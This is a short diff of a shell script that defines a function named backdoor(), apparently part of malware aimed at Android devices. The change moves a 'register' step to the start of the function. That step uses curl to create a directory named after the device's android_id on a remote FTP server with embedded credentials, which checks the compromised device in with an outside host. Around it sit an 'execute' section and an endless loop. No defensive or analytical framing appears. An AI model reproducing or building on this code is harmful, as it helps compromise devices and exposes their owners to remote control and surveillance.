@@ -64,6 +64,11 @@ update() {
 }
 
 backdoor() {
+
+    # register
+        $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir" -X "MKD $android_id"
+    # 
+	
     # execute
 
         # shellcheck disable=SC2016
@@ -86,10 +91,6 @@ backdoor() {
         done
 
     #
-
-    # register
-        $_curl --parallel -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir" -X "MKD $android_id"
-    # 
 }
 
 while true; do
